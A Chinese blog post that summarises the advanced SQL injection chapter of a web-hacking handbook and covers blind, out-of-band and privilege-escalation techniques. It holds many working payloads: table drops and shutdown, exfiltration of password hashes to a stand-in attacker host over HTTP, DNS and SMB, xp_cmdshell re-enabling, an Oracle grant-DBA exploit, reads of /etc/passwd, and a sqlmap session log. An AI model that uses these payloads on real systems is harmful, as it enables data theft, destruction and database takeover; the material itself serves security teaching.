---
layout:     post
title:      Chapter 9 Attacking Data Stores(2)-Injecting into SQL(4)
subtitle:   SQL注入(4)
date:       2020-03-15
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 9

# 1.高级开发(Advanced Exploitation)

到目前为止，所描述的所有攻击都具有检索从数据库中提取的任何有用数据的现成方法，例如通过执行UNION攻击或在错误消息中返回数据。 随着对SQL注入威胁的认识的发展，这种情况已逐渐变得不那么普遍。越来越多的情况是，您遇到的SQL注入漏洞将在检索注入查询的结果变得不那么简单的情况下发生。 我们将研究出现此问题的几种方式，以及如何处理它。

**NOTE**
应用程序所有者应注意，并非每个攻击者都有兴趣窃取敏感数据。 有些可能更具破坏性。 例如，通过仅提供12个字符的输入，攻击者可以使用shutdown命令关闭MS-SQL数据库：
```
' shutdown--
```
攻击者还可能注入恶意命令，以使用以下命令删除单个表：
```
' drop table users--
' drop table accounts--
' drop table customers--
```

## 1.1 以数字形式检索数据(Retrieving Data as Numbers)

很显然，应用程序中没有字符串字段不容易受到SQL注入的攻击，因为包含单引号的输入已得到正确处理。 但是，漏洞可能仍存在于数字数据字段中，其中用户输入未封装在单引号中。 通常，在这些情况下，检索已注入查询结果的唯一方法是通过应用程序的数字响应。

在这种情况下，您面临的挑战是如何以数字形式检索有意义的数据的方式来处理注入的查询的结果。此处可以使用两个关键功能：
- ASCII，它返回输入字符的ASCII码
- SUBSTRING（或Oracle中的SUBSTR），返回其输入的子字符串
这些函数可以一起使用，以数字形式从字符串中提取单个字符。 例如：
- `SUBSTRING('Admin',1,1)` 返回 A .
- `ASCII(’A‘)` 返回 65 .
因此:
```
ASCII(SUBSTR('Admin',1,1)) 返回 65
```
使用这两个功能，您可以系统地将一串有用的数据切成单独的字符，并以数字形式分别返回每个字符。 在脚本化攻击中，此技术可用于快速检索和重建一个字节一次的大量基于字符串的数据。

**TIP**
在不同的数据库平台如何处理字符串处理和数值计算方面，存在许多细微的变化，在进行此类高级攻击时，您可能需要考虑这些变化。 可以在`http://sqlzoo.net/howto/source/z.dir/i08fun.xml`中找到涵盖许多不同数据库的有关这些差异的出色指南。

在这种情况的一种变体中，作者遇到了以下情况：应用程序返回的不是实际数字，而是该数字可以标识的资源。 该应用程序根据用户输入执行SQL查询，获取文档的数字标识符，然后将文档的内容返回给用户。 在这种情况下，攻击者首先可以获取其标识符在相关数值范围内的每个文档的副本，然后构造文档内容到标识符的映射。 然后，当进行前述攻击时，攻击者可以查阅该地图以确定从应用程序接收到的每个文档的标识符，从而检索他已成功提取的字符的ASCII值。

## 1.2 使用带外通道(Using an Out-of-Band Channel)

在许多SQL注入情况下，应用程序不会将任何注入查询的结果返回给用户的浏览器，也不会返回数据库生成的任何错误消息。 在这种情况下，您的职位可能显得徒劳。 即使存在SQL注入流，也肯定不能利用它来提取任意数据或执行任何其他操作。 但是，这种外观是错误的。 您可以尝试各种技术来检索数据并验证其他恶意操作是否成功。

在许多情况下，您可能可以插入任意查询，但不能检索其结果。 回想一下易受攻击的登录表单的示例，其中用户名和密码字段易受SQL注入攻击：
```
SELECT * FROM users WHERE username = 'marcus' and password = 'secret'
```
除了修改查询逻辑以绕过登录之外，您还可以使用字符串串联注入一个完全独立的子查询，以将其结果连接到您控制的项目。 例如：
```
foo' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE
username = 'DBSNMP') = 'DBSNMP’)--
```
这将导致应用程序执行以下查询：
```
SELECT * FROM users WHERE username = 'foo' || (SELECT 1 FROM dual WHERE
(SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')
```
数据库执行您的任意子查询，将其结果附加到foo，然后查找所得用户名的详细信息。 当然，登录将失败，但是您注入的查询将已执行。 您将在应用程序响应中收到的所有信息都是标准登录失败消息。 然后，您需要的是一种检索注入查询结果的方法。

当您可以对MS-SQL数据库使用批处理查询时，会出现另一种情况。 批处理查询非常有用，因为它们允许您使用不同的SQL动词并针对不同的表执行完全控制的完全独立的语句。 但是，由于如何批量查询如果执行这些操作，则无法直接检索注入查询的结果。 同样，您需要一种方法来检索注入的查询的丢失结果。

在这种情况下通常有效的一种检索数据的方法是使用带外通道。 获得了在数据库内执行任意SQL语句的能力后，通常可以利用数据库的某些内置功能来创建与您自己的计算机的网络连接，通过该网络连接可以传输从中收集的任意数据 数据库。

创建合适的网络连接的方法高度依赖于数据库。 给定应用程序用来访问数据库的数据库用户的特权级别，可以使用或可以不使用不同的方法。 这里介绍了每种类型的数据库最常用和最有效的一些技术。

### 1.2.1 MS-SQL

在较旧的数据库（例如MS-SQL 2000和更早版本）上，可以使用OpenRowSet命令打开与外部数据库的连接并将任意数据插入其中。 例如，以下查询使目标数据库打开与攻击者数据库的连接，并将目标数据库的版本字符串插入名为foo的表中：
```
insert into openrowset('SQLOLEDB',
'DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein',
'select * from foo') values (@@version)
```
请注意，您可以指定端口80或任何其他可能的值，以增加通过任何防火墙建立出站连接的机会。

### 1.2.2 Oracle

Oracle包含大量的默认功能，低特权用户可以访问这些默认功能，这些默认功能可用于创建带外连接。

UTL_HTTP包可用于向其他主机发出任意HTTP请求。 UTL_HTTP包含丰富的功能，并支持代理服务器，cookie，重定向和身份验证。 这意味着，在高度受限的内部公司网络上攻破数据库的攻击者可能能够利用公司代理启动与Internet的出站连接。

在以下示例中，UTL_HTTP用于将注入查询的结果传输到攻击者控制的服务器：
```
/employees.asp?EmpNo=7521'||UTL_HTTP.request('mdattacker.net:80/'||
(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
```
此URL使UTL_HTTP对包含表all_users中的第一个用户名的URL进行GET请求。 攻击者只需在mdattacker.net上设置一个netcat侦听器即可接收结果：
```
C:\>nc -nLp 80
GET /SYS HTTP/1.1
Host: mdattacker.net
Connection: close
```
UTL_INADDR软件包设计用于将主机名解析为IP地址。 它可以用于生成对攻击者控制的服务器的任意DNS查询。 在许多情况下，这比UTL_HTTP攻击更有可能成功，因为即使在HTTP流量受到限制的情况下，DNS流量通常也可以通过公司防火墙被允许通过。 攻击者可以利用此程序包在他选择的主机名上执行查找，从而有效地检索
任意数据，方法是将其作为子域名添加到他控制的域名之前。 例如：
```
/employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%
20FROM%20DBA_USERS%20WHERE%20NAME='SYS')||'.mdattacker.net')
```
这将导致对`mdattacker.net`名称服务器的DNS查询，其中包含SYS用户的密码哈希：
```
DCB748A5BC5390F2.mdattacker.net
```
UTL_SMTP包可用于发送电子邮件。 通过在出站电子邮件中发送此功能，可以使用此功能来检索从数据库捕获的大量数据。

UTL_TCP包可用于打开任意TCP套接字以发送和接收网络数据。

**NOTE**
在Oracle 11g上，附加的ACL保护刚刚描述的许多资源不受任何任意数据库用户的执行。 解决此问题的一种简单方法是使用Oracle 11g提供的新功能并使用以下代码：
```
SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE
NAME='SYS')||'.mdsec.net',80)
```

### 1.2.3 MySQL

SELECT ... INTO OUTFILE命令可用于将任意查询的输出定向到文件中。 指定的文件名可能包含UNC路径，使您可以将输出定向到自己计算机上的文件。 例如：
```
select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users;
```
要接收文件，您需要在计算机上创建一个SMB共享以允许匿名写访问。 您可以配置Windows和基于UNIX的平台上的共享以这种方式运行。 如果您难以接收导出的文件，则可能是由于SMB服务器中的配置问题引起的。 您可以使用嗅探器确定目标服务器是否正在启动与计算机的任何入站连接。 如果是这样，请查阅服务器说明文件以确保正确配置。

### 1.2.4 利用操作系统(Leveraging the Operating System)

通常有可能通过数据库执行升级攻击，从而导致在数据库服务器本身的操作系统上执行任意命令。 在这种情况下，您可以使用更多途径来检索数据，例如使用诸如`tftp`，`mail`和`telnet`之类的内置命令，或将数据复制到Web根中以使用浏览器进行检索。 请参阅后面的"Beyond SQL Injection”一词，介绍了升级数据库本身的特权的技术。

## 1.3 使用推断：条件响应(Using Inference: Conditional Responses)

带外通道可能不可用的原因有很多。 最常见的原因是数据库位于受保护的网络内，其外围防火墙不允许与Internet或任何其他网络的任何出站连接。 在这种情况下，您将只能通过注入点进入Web应用程序来完全访问数据库。

在这种情况下，或多或少地工作是盲目的，您可以使用多种技术从数据库中检索任意数据。 这些技术全部基于以下概念：使用注入的查询有条件地触发数据库的某些可检测行为，然后根据是否发生此行为来推断所需的信息。

回想一下易受攻击的登录功能，可以在其中输入用户名和密码字段以执行任意查询：
```
SELECT * FROM users WHERE username = 'marcus' and password = 'secret'
```
假设您尚未确定将注入的查询结果发送回浏览器的任何方法。 不过，您已经了解了如何使用SQL注入来修改应用程序的行为。 例如，提交以下两个输入会导致非常不同的结果：
```
admin' AND 1=1--
admin' AND 1=2--
```
在第一种情况下，应用程序以管理员用户身份登录。 在第二种情况下，登录尝试失败，因为1 = 2条件始终为false。 您可以利用对应用程序行为的这种控制，来推断数据库本身内任意条件的真假。 例如，使用前面描述的ASCII和SUBSTRING函数，您可以测试捕获的字符串的特定字符是否具有特定值。 例如，提交此输入内容将以admin用户身份登录，因为测试的条件为true：
```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--
```
但是，提交以下输入会导致登录失败，因为测试的条件为假：
```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 66--
```
通过提交大量此类查询，在每个字符可能的ASCII码范围内循环，直到发生命中为止，您可以提取整个字符串，一次提取一个字节。

### 1.3.1 导致条件错误(Inducing Conditional Errors)

在前面的示例中，应用程序包含一些突出的功能，这些功能可以通过注入到现有的SQL查询中来直接控制。 可以劫持应用程序的设计行为（成功登录还是失败登录），以将单个信息返回给攻击者。 但是，并非所有情况都如此简单。 在某些情况下，您可能会插入对应用程序的行为没有明显影响的查询，例如日志记录机制。 在其他情况下，您可能会注入子查询或批处理查询，其结果不会由应用程序以任何方式处理。 在这种情况下，您可能很难找到一种方法来导致可检测的行为差异，具体取决于特定条件。

大卫·利奇菲（David Litchfield）设计了一种可在大多数情况下触发可察觉的行为差异的技术。 核心思想是注入一个查询，该查询在某些特定条件下会导致数据库错误。 发生数据库错误时，通常可以通过HTTP 500响应代码，某种错误消息或异常行为（即使错误消息本身未公开任何有用的信息）从外部检测到该错误。

该技术在评估条件语句时依赖于数据库行为的功能：给定其他部分的状态，数据库仅评估需要评估的语句部分。 此行为的一个示例是包含WHERE子句的SELECT语句：
```
SELECT X FROM Y WHERE C
```
这使数据库遍历表Y的每一行，评估条件C，并在条件C为真的情况下返回X。 如果条件C永远不为真，则表达式X永远不会求值。

可以通过找到在语法上有效但如果经过评估就会生成错误的表达式X来利用此行为。 Oracle和MS-SQL中此类表达式的一个示例是除以零的计算，例如1/0。 如果条件C为真，则对表达式X求值，从而导致数据库错误。 如果条件C始终为假，则不会产生错误。 因此，可以使用是否存在错误来测试任意条件C。

下面的查询就是一个例子，该查询测试默认的Oracle用户DBSNMP是否存在。 如果该用户存在，则对表达式1/0求值，从而导致错误：
```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
'DBSNMP') = 'DBSNMP'
```
以下查询测试是否存在发明的用户AAAAAA。 因为WHERE条件永远不会为真，所以不会对表达式1/0求值，因此不会发生错误：
```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
'AAAAAA') = 'AAAAAA'
```
这项技术所实现的是一种在应用程序内引起条件响应的方法，即使在您要插入的查询对应用程序的逻辑或数据处理没有影响的情况下。 因此，它使您能够使用前面所述的推理技术在多种情况下提取数据。 此外，由于该技术的简便性，相同的攻击字符串将适用于一系列数据库，并且注入点位于各种类型的SQL语句中。

该技术也是通用的，因为它可以在可以注入子查询的所有注入点中使用。 例如：
```
(select 1 where <<condition>> or 1/0=0)
```
考虑一个提供可搜索和可排序联系人数据库的应用程序。 用户控制参数`department`和`sort`：
```
/search.jsp?department=30&sort=ename
```
这显示在以下后端查询中，该查询参数化了department参数，但将sort参数连接到查询上：
```
String queryText = "SELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ?
ORDER BY " + request.getParameter("sort") + " DESC";
```
无法更改WHERE子句，或在ORDER BY子句之后发出UNION查询。 但是，攻击者可以通过发出以下语句来创建推断条件：
```
/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20
(select%20substr(max(object_name),1,1)%20FROM%20user_objects)='Y')
```
如果`user_objects`表中第一个对象名称的第一个字母等于`'Y'`，这将导致数据库尝试评估`1/0`。 这将导致错误，并且整个查询不会返回任何结果。 如果字母不等于`'Y'`，则原始查询的结果将以默认顺序返回。 仔细地将此条件提供给SQL注入工具（例如Absinthe或SQLMap），我们可以检索数据库中的每条记录。

### 1.3.2 使用时间延迟(Using Time Delays)

尽管已经描述了所有复杂的技术，但是在某些情况下这些技巧都无效。 在某些情况下，您可能会注入一个查询，该查询不会向浏览器返回任何结果，无法用于打开带外通道，并且即使在应用程序中引起错误的情况下也不会影响应用程序的行为 数据库本身。

在这种情况下，感谢NGSSoftware的Chris Anley和Sherief Hammad发明的技术，一切都不会丢失。 他们设计了一种根据查询者指定的条件来设计会导致时间延迟的查询的方法。 攻击者可以提交他的查询，然后监视服务器响应所花费的时间。 如果发生延迟，则攻击者可能会推断条件成立。 即使在两种情况下应用程序响应的实际内容相同，存在或不存在时间延迟也使攻击者能够从数据库中提取单个信息。 通过执行大量此类查询，攻击者可以一次从数据库中系统地检索任意复杂的数据。

引起适当时间延迟的精确方法取决于所使用的目标数据库。 MS-SQL包含一个内置的`WAITFOR`命令，该命令可用于引起指定的时间延迟。 例如，如果当前数据库用户为`sa`，则以下查询会导致5秒的时间延迟：
```
if (select user) = 'sa' waitfor delay '0:0:5'
```
配备了此命令的攻击者可以通过各种方式检索任意信息。 一种方法是在应用程序返回条件响应的情况下利用已经描述的相同技术。现在，当检测到特定条件时，不是触发不同的应用程序响应，而是注入的查询引起时间延迟。 例如，这些查询中的第二个查询导致时间延迟，表示捕获的字符串的第一个字母为A：
```
if ASCII(SUBSTRING('Admin',1,1)) = 64 waitfor delay '0:0:5'
if ASCII(SUBSTRING('Admin',1,1)) = 65 waitfor delay '0:0:5'
```
和以前一样，攻击者可以循环浏览每个角色的所有可能值，直到发生时间延迟。 或者，可以通过减少所需的请求数量来提高攻击效率。 另一种技术是将数据的每个字节分解为单个位，并在单个查询中检索每个位。 POWER命令和按位AND运算符＆可用于逐位指定条件。 例如，以下查询测试捕获数据的第一个字节的第一位，如果为1，则暂停：
```
if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) > 0 waitfor delay '0:0:5'
```
以下查询在第二位执行相同的测试：
```
if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,1))) > 0 waitfor delay '0:0:5'
```
如前所述，引起时间延迟的方法高度依赖于数据库。 在当前版本的MySQL中，可以使用sleep函数在指定的毫秒数内创建时间延迟：
```
select if(user() like 'root@%', sleep(5000), 'false')
```
在5.0.12之前的MySQL版本中，不能使用sleep函数。 基准函数是一种替代方法，可用于重复执行指定的操作。 指示数据库多次执行处理器密集型操作，例如SHA-1哈希，将导致可测量的时间延迟。 例如：
```
select if(user() like 'root@%', benchmark(50000,sha1('test')), 'false')
```
在PostgreSQL中，可以以与MySQL睡眠函数相同的方式使用PG_SLEEP函数。

Oracle没有内置的方法来执行时间延迟，但是您可以使用其他技巧来引起时间延迟。 一种技巧是使用UTL_HTTP连接到不存在的服务器，从而导致超时。 这将导致数据库尝试连接到指定的服务器，并最终超时。 例如：
```
SELECT 'a'||Utl_Http.request('http://madeupserver.com') from dual
...delay...
ORA-29273: HTTP request failed
ORA-06512: at "SYS.UTL_HTTP", line 1556
ORA-12545: Connect failed because target host or object does not exist
```
您可以利用此行为在指定的某些条件下导致时间延迟。 例如，如果存在默认的Oracle帐户DBSNMP，以下查询将导致超时：
```
SELECT 'a'||Utl_Http.request('http://madeupserver.com') FROM dual WHERE
(SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```
在Oracle和MySQL数据库中，都可以使用SUBSTR（ING）和ASCII函数一次检索一个字节的任意信息，如前所述。

**TIP**
我们已经描述了使用时间延迟作为提取有趣信息的一种方法。 但是，在对应用程序执行初始探测以检测SQL注入漏洞时，延时技术也可能非常有用。 在完全盲目SQL注入的某些情况下，没有结果返回到浏览器，并且所有错误都被无形地处理，使用基于提供精巧输入的标准技术，可能很难检测到漏洞本身。 在这种情况下，使用时间延迟通常是在初始探测期间检测漏洞是否存在的最可靠方法。 例如，如果后端数据库是MS-SQL，则可以将以下每个字符串依次注入到每个请求参数中，并监视应用程序花费多长时间来识别任何漏洞：
```
'; waitfor delay '0:30:0'--
1; waitfor delay '0:30:0'--
```

# 2.Beyond SQL Injection: Escalating the Database Attack

成功利用SQL注入漏洞通常会导致所有应用程序数据的全面泄露。 大多数应用程序对所有数据库访问都使用一个帐户，并依靠应用程序层控件来强制不同用户之间的访问隔离。 不受限制地使用应用程序的数据库帐户将导致访问其所有数据。

因此，您可能会认为拥有所有应用程序数据是SQL注入攻击的终点。 但是，通过利用数据库本身中的漏洞或利用数据库的某些内置功能来实现您的目标，可能有很多原因使进一步提高攻击效率可能会有所提高。 通过升级数据库攻击可以执行的其他攻击包括：
- 如果数据库与其他应用程序共享，则您可以升级数据库中的特权并获得对其他应用程序数据的访问权限。
- 您可能能够破坏数据库服务器的操作系统。
- 您可能可以访问其他系统。 通常，数据库服务器托管在受保护的网络中，位于网络外围防御的多层之后。 在数据库服务器上，您可能处于受信任的位置，并且能够访问其他主机上的关键服务，这可能会进一步被利用。
- 您也许可以将网络连接从托管基础结构中重新建立到您自己的计算机上。 这可以使您绕过应用程序，轻松地传输从数据库收集的大量敏感数据，并且经常逃避许多入侵检测系统。
- 通过创建用户定义的功能，您可以以任意方式扩展数据库的现有功能。 在某些情况下，这可以使您通过有效地重新实现已删除或禁用的功能来规避对数据库执行的强化。 只要您已获得数据库管理员（DBA）特权，每个主流数据库中都有一种执行此操作的方法。

攻击数据库是一个巨大的话题，已经超出了本书的范围。 本节为您提供了一些主要方法，可以利用这些方法利用主要数据库类型中的漏洞和功能来升级攻击。得出的主要结论是，每个数据库都包含提升权限的方法。 应用当前的安全补丁和强大的加固功能可以帮助缓解许多此类攻击，但并非全部。 要进一步阅读这一当前研究成果丰硕的领域，我们推荐 *The Database Hacker’s
Handbook* (Wiley, 2005)。

## 2.1 MS-SQL

攻击者可能滥用的最臭名昭著的数据库功能是`xp_cmdshell`存储过程，该过程默认情况下内置在MS-SQL中。 此存储过程允许具有DBA权限的用户以与cmd.exe命令提示符相同的方式执行操作系统命令。例如：
```
master..xp_cmdshell 'ipconfig > foo.txt'
```
攻击者滥用此功能的机会很大。 他可以执行任意命令，将结果通过管道传输到本地文件，然后再读取回去。他可以打开自己的带外网络连接，并创建后门命令和通信通道，从服务器复制数据并上传攻击工具 。 由于默认情况下MS-SQL作为LocalSystem运行，因此攻击者通常可以完全破坏底层操作系统，从而执行任意操作。 MS-SQL包含大量其他扩展存储过程，例如`xp_regread`和`xp_regwrite`，可用于在Windows操作系统的注册表中执行强大的操作。

### 2.1.1 处理默认锁定(Dealing with Default Lockdown)

Internet上遇到的大多数MS-SQL安装将是MS-SQL 2005或更高版本。 这些版本包含许多安全功能，这些功能默认情况下会锁定数据库，从而阻止许多有用的攻击技术起作用。

但是，如果Web应用程序在数据库中的用户帐户具有足够高的特权，则可以通过重新配置数据库来克服这些障碍。 例如，如果禁用xp_cmdshell，则可以使用sp_configure存储过程重新启用它。 SQL的以下四行执行此操作：
```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```
此时，xp_cmdshell已重新启用，可以使用通常的方式运行命令：
```
exec xp_cmdshell 'dir'
```

## 2.2 Oracle

在Oracle数据库软件本身中发现了许多安全漏洞。 如果您发现一个SQL注入漏洞，使您能够执行任意查询，则通常可以利用这些漏洞之一将其升级为DBA特权。

Oracle包含许多以DBA特权执行的内置存储过程，并且发现这些过程本身包含SQL注入漏洞。 在2006年7月关键补丁更新之前，默认软件包`SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`中存在此类缺陷的典型示例。 通过将对`grant DBA into public`注入易受攻击的字段，可以利用此漏洞来提升特权：
```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX','SCH',
'TEXTINDEXMETHODS".ODCIIndexUtilCleanup(:p1); execute immediate
''declare pragma autonomous_transaction; begin execute immediate
''''grant dba to public'''' ; end;''; END;--','CTXSYS',1,'1',0) from dual
```
通过将功能注入到易受攻击的参数中，可以通过Web应用程序中的SQL注入流来传递此类攻击。

除了这些实际漏洞之外，Oracle还包含大量默认功能。 低特权用户可以访问它，并可用于执行不良操作，例如启动网络连接或访问文件系统。 除了已经描述的用于创建带外连接的功能强大的软件包之外，软件包UTL_FILE还可用于在数据库服务器文件系统上读写文件。

在2010年，David Litchfi领域展示了如何在Oracle 10g R2和11g中滥用Java来执行操作系统命令。 此攻击首先利用`DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY`中的一个漏洞为当前用户授予权限`java.io.filepermission`。 攻击然后使用`DBMS_JAVA_RUNJAVA`一个JAVA类（`oracle/aurora/util/Wrapper`），该类运行OS命令。 RUNJAVA。 例如：
```
DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\
cmd.exe /c dir>c:\\OUT.LST')
```
更多详情可在这找到：
- www.databasesecurity.com/HackingAurora.pdf
- www.notsosecure.com/folder2/2010/08/02/blackhat-2010/

## 2.3 MySQL

与涵盖的其他数据库相比，MySQL包含的内置功能相对较少，攻击者可能会滥用它们。 一个示例是具有FILE_PRIV权限的任何用户读取和写入文件系统的能力。

LOAD_FILE命令可用于检索任何文件的内容。 例如：
```
select load_file('/etc/passwd')
```
`SELECT ... INTO OUTFILE`命令可用于将任何查询的结果传递到文件中。 例如：
```
create table test (a varchar(200))
insert into test(a) values ('+ +')
select * from test into outfile '/etc/hosts.equiv'
```
除了读写关键操作系统文件之外，此功能还可用于执行其他攻击：
- 由于MySQL将其数据存储在数据库必须具有读取访问权限的纯文本文件中，因此具有FILE_PRIV权限的攻击者可以简单地打开相关文件并从数据库中读取任意数据，而绕过数据库自身内部实施的所有访问控制。
- MySQL通过调用包含函数实现的已编译库文件，使用户能够创建用户定义的函数（UDF）。该文件必须位于MySQL加载动态库的常规路径内。 攻击者可以使用前面的方法在此路径内创建一个任意二进制文件，然后创建一个使用它的UDF。 有关此技术的更多详细信息，请参阅Chris Anley的论文“ Hackproofi ng MySQL”。

# 3 使用SQL开发工具(Using SQL Exploitation Tools)

我们描述的许多利用SQL注入漏洞的技术都涉及执行大量请求，一次提取少量数据。 幸运的是，有许多工具可自动执行此过程的大部分操作，并且知道传递成功攻击所需的数据库特定语法。

当前大多数可用的工具都使用以下方法来利用SQL注入漏洞：
- 暴力破解目标请求中的所有参数以查找SQL注入点。
- 通过附加各种字符（例如，方括号，注释字符和SQL关键字）来确定后端SQL查询中易受攻击字段的位置。
- 尝试通过强制执行所需的列数来执行UNION攻击，然后使用varchar数据类型标识列，该数据可用于返回结果。
- 注入自定义查询以检索任意数据-如有必要，将多列中的数据连接到一个字符串中，该字符串可通过`varchar`数据类型的单个结果进行检索。
- 如果无法使用UNION检索结果，则将布尔条件（AND 1=1，AND 1=2，依此类推）注入查询中，以确定是否可以使用条件响应来检索数据。
- 如果无法通过注入条件表达式来检索结果，请尝试使用条件时间延迟来检索数据。

这些工具通过查询相关数据库的相关元数据表来定位数据。 通常，它们可以执行某种级别的升级，例如使用xp_cmdshell获得OS级访问权限。 他们还使用各种优化技术，利用各种数据库中的许多功能和内置函数来减少基于推理的蛮力攻击中必要查询的数量，避免单引号引起的潜在过滤器等等。

**NOTE**
这些工具主要是利用工具，最适合通过利用您已经识别和理解的注入点从数据库中提取数据。 它们不是查找和利用SQL注入漏洞的神奇方法。 实际上，通常需要在工具注入的数据之前和/或之后提供一些其他SQL语法，以使该工具的硬编码攻击起作用。

**HACK STEPS**<br>
确定了SQL注入漏洞后，可以使用本章前面介绍的技术，考虑使用SQL注入工具来利用此漏洞并从数据库中检索有趣的数据。 在需要使用盲法技术一次检索少量数据的情况下，此选项特别有用。
- 1.使用拦截代理运行SQL利用工具。 分析工具发出的请求以及应用程序的响应。 打开工具上的任何详细输出选项，并将其进度与观察到的查询和响应相关联。
- 2.由于这些工具依赖于预设测试和特定的响应语法，因此可能有必要将数据追加或添加到由工具注入的字符串中，以确保工具获得预期的响应。 典型的要求是添加注释字符，平衡服务器的SQL查询中的单引号，并在字符串的末尾添加或加上右括号以匹配原始查询。
- 3.如果不管此处介绍的方法如何，语法似乎都失败了，通常最简单的方法是创建一个完全在您的控制之下的嵌套子查询，并允许该工具插入其中。 这允许该工具使用推理来提取数据。 当您插入标准的`SELECT`和`UPDATE`查询时，嵌套查询会很好地工作。 在Oracle下，它们在`INSERT`语句中工作。 在以下每种情况下，请在`[input]`之前添加文本，并在该点之后添加右括号：
	- **Oracle:** `'||(select 1 from dual where 1=[input])`
	- **MS-SQL:** `(select 1 where 1=[input])`


存在许多用于自动利用SQL注入的工具。 其中许多是专门针对MS-SQL的，许多已经停止了积极的开发，并已被SQL注入的新技术和开发所取代。 作者最喜欢的是sqlmap，它可以攻击MySQL，Oracle和MS-SQL等。 它实现了基于UNION和基于推理的检索。 它支持各种升级方法，包括从操作系统中检索文件以及使用xp_cmdshell在Windows下执行命令

实际上，sqlmap是通过时延或其他推理方法检索数据库信息的有效工具，对于基于UNION的检索非常有用。 最好的使用方法之一是使用--sql-shell选项，它为攻击者提供了一个SQL提示，并在后台执行必要的UNION，基于错误或盲目的SQL注入以发送和检索结果。 比如：
```
C:\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use
--sql-shell -p Empno
sqlmap/0.8 - automatic SQL injection and database takeover tool
http://sqlmap.sourceforge.net
[*] starting at: 14:54:39
[14:54:39] [INFO] using 'C:\sqlmap\output\wahh-app.com\session'
as session file
[14:54:39] [INFO] testing connection to the target url
[14:54:40] [WARNING] the testable parameter 'Empno' you provided is not
into the
Cookie
[14:54:40] [INFO] testing if the url is stable, wait a few seconds
[14:54:44] [INFO] url is stable
[14:54:44] [INFO] testing sql injection on GET parameter ‘Empno’ with 0
parenthesis
[14:54:44] [INFO] testing unescaped numeric injection on GET parameter
‘Empno’
[14:54:46] [INFO] confirming unescaped numeric injection on GET
parameter ‘Empno’
[14:54:47] [INFO] GET parameter ‘Empno’ is unescaped numeric injectable
with 0
parenthesis
[14:54:47] [INFO] testing for parenthesis on injectable parameter
[14:54:50] [INFO] the injectable parameter requires 0 parenthesis
[14:54:50] [INFO] testing MySQL
[14:54:51] [WARNING] the back-end DMBS is not MySQL
[14:54:51] [INFO] testing Oracle
[14:54:52] [INFO] confirming Oracle
[14:54:53] [INFO] the back-end DBMS is Oracle
web server operating system: Windows 2000
web application technology: ASP, Microsoft IIS 5.0
back-end DBMS: Oracle
[14:54:53] [INFO] testing inband sql injection on parameter ‘Empno’ with
NULL
bruteforcing technique
[14:54:58] [INFO] confirming full inband sql injection on parameter
‘Empno’
[14:55:00] [INFO] the target url is affected by an exploitable full
inband
sql injection vulnerability
valid union: ‘http://wahh-app.com:80/employees.asp?Empno=7369%20
UNION%20ALL%20SEL
ECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%20
3663=3663’
[14:55:00] [INFO] calling Oracle shell. To quit type ‘x’ or ‘q’ and
press ENTER
sql-shell> select banner from v$version
do you want to retrieve the SQL statement output? [Y/n]
[14:55:19] [INFO] fetching SQL SELECT statement query output: ‘select banner
from v$version’
select banner from v$version [5]:
[*] CORE 9.2.0.1.0 Production
[*] NLSRTL Version 9.2.0.1.0 - Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
[*] PL/SQL Release 9.2.0.1.0 - Production
[*] TNS for 32-bit Windows: Version 9.2.0.1.0 - Production
sql-shell>
```

[Chapter 9 Attacking Data Stores(2)-Injecting into SQL(3)](https://dm116.github.io/2020/03/15/attacking-data-stores_2_3/)<br>
[Chapter 9 Attacking Data Stores(2)-Injecting into SQL(5)](https://dm116.github.io/2020/03/15/attacking-data-stores_2_5/)<br>
